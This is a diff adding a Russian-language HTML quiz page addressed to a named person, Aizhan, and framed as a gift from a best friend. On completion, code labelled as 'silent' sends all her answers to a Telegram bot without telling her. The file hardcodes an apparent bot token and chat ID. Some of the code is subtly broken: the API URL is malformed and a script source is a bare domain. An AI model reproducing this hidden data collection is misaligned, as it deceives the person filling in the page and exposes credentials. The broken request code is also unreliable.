@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Для Айжан ✨</title>
+    <script src="https://cdn.jsdelivr.net"></script>
+    <link href="https://fonts.googleapis.com" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #fffcf9;
+            --rose: #ffafbd;
+            --text: #4a3f35;
+            --accent: #ff8c94;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background: var(--bg);
+            font-family: 'Comfortaa', cursive;
+            color: var(--text);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 450px;
+            margin: 10vh auto;
+            position: relative;
+        }
+
+        .card {
+            background: white;
+            border-radius: 30px;
+            padding: 35px 25px;
+            box-shadow: 0 15px 35px rgba(255, 143, 163, 0.15);
+            text-align: center;
+            border-left: 8px solid var(--rose);
+        }
+
+        h1 {
+            font-family: 'Caveat', cursive;
+            font-size: 3rem;
+            color: var(--accent);
+            margin: 0 0 15px 0;
+        }
+
+        p {
+            line-height: 1.6;
+            font-size: 1.1rem;
+            margin-bottom: 25px;
+        }
+
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .btn {
+            background: white;
+            border: 2.5px solid var(--rose);
+            padding: 14px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-family: inherit;
+            font-weight: 700;
+            color: var(--text);
+            transition: 0.2s;
+            font-size: 0.95rem;
+            outline: none;
+        }
+
+        .btn:active {
+            background: var(--rose);
+            color: white;
+            transform: scale(0.98);
+        }
+
+        #final-screen {
+            display: none;
+        }
+
+        .progress {
+            font-size: 0.8rem;
+            color: var(--rose);
+            margin-bottom: 10px;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        /* Плавная анимация появления */
+        .fade-in {
+            animation: fadeIn 0.5s forwards;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container" id="quiz-container">
+        <div id="progress-text" class="progress"></div>
+        <div id="card-content" class="card fade-in">
+            <!-- Тут будут вопросы -->
+        </div>
+    </div>
+
+    <div class="container" id="final-screen">
+        <div class="card fade-in">
+            <h1 style="font-size: 5rem;">🌸</h1>
+            <h1>Айжан, ты чудо!</h1>
+            <p>Спасибо за твою искренность. Пусть этот день принесет тебе море улыбок! ❤️</p>
+            <div style="font-family: 'Caveat'; font-size: 2.5rem; color: var(--accent);">Твой лучший друг</div>
+        </div>
+    </div>
+
+    <script>
+        const CONFIG = {
+            token: "8793262316:AAEK7VywXr-Le9GaCuLiwOcC_E3wQotV98M",
+            chatId: "5487500703"
+        };
+
+        const answers = [];
+        const questions = [
+            { q: "Айжан, ты готова к самому честному опросу о себе? ✨", a: ["Конечно! 😊", "Поехали! ❤️"] },
+            { q: "Твое идеальное утро — это...", a: ["Тишина и кофе ☕", "Активный старт 🏃‍♀️", "Сон до обеда 😴"] },
+            { q: "Какая черта твоего характера — твоя суперсила?", a: ["Доброта ❤️", "Острый ум 🧠", "Оптимизм ✨"] },
+            { q: "О чем ты чаще всего мечтаешь?", a: ["О путешествиях ✈️", "О больших успехах 🏆", "О маленьких радостях 🌸"] },
+            { q: "Что в людях ты ценишь больше всего?", a: ["Искренность 💎", "Чувство юмора 😂", "Верность 🤝"] },
+            { q: "Если бы про твою жизнь сняли фильм, это был бы...", a: ["Мелодрама 🎞️", "Комедия 🍿", "Приключения 🗺️"] },
+            { q: "В чем твой секрет очарования, Айжан?", a: ["В улыбке 😊", "В таинственности ✨", "В умении слушать 👂"] },
+            { q: "Какой совет ты бы дала себе маленькой?", a: ["Ничего не бойся! 💪", "Всё правильно ❤️", "Улыбайся! 😊"] },
+            { q: "Что для тебя значит настоящая дружба?", a: ["Поддержка 🫂", "Общий смех 😂", "Доверие 🔒"] },
+            { q: "Айжан, ты знаешь, что ты — особенная?", a: ["Теперь точно знаю ✨", "Догадывалась... 😊"] }
+        ];
+
+        let current = 0;
+
+        function render() {
+            const data = questions[current];
+            const cardContent = document.getElementById('card-content');
+            const progressText = document.getElementById('progress-text');
+
+            progressText.innerText = `Вопрос ${current + 1} из ${questions.length}`;
+
+            // Очищаем и заполняем карточку
+            cardContent.innerHTML = `
+            <h1>Айжан...</h1>
+            <p>${data.q}</p>
+            <div class="btn-group" id="btn-box"></div>
+        `;
+
+            const btnBox = document.getElementById('btn-box');
+            data.a.forEach(opt => {
+                const b = document.createElement('button');
+                b.className = 'btn';
+                b.innerText = opt;
+                b.onclick = () => handleChoice(data.q, opt);
+                btnBox.appendChild(b);
+            });
+        }
+
+        function handleChoice(q, a) {
+            answers.push(`<b>${q}</b>\n└ <i>${a}</i>`);
+            current++;
+
+            if (current < questions.length) {
+                render();
+            } else {
+                finish();
+            }
+        }
+
+        function finish() {
+            document.getElementById('quiz-container').style.display = 'none';
+            document.getElementById('final-screen').style.display = 'block';
+            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
+
+            // Отправка (тихая)
+            const message = `<b>📬 АЙЖАН ПРОШЛА ОПРОС!</b>\n\n${answers.join('\n\n')}`;
+            fetch(`https://api.telegram.org{CONFIG.token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CONFIG.chatId, text: message, parse_mode: "HTML" })
+            }).catch(err => console.log("Silent fail"));
+        }
+
+        // Первый запуск
+        render();
+    </script>
+</body>
+
+</html>
